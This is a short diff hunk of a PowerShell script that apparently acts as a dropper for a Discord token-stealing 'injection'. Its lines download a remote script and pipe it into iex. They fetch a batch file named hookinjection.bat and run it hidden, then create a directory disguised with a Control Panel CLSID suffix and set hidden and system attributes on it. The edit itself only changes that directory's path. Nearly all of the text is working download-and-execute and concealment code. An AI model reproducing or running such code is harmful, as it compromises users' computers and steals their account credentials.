@@ -19,7 +19,7 @@ iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
 Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden
 
-$rdir = "$env:appdata\Client"
+$rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
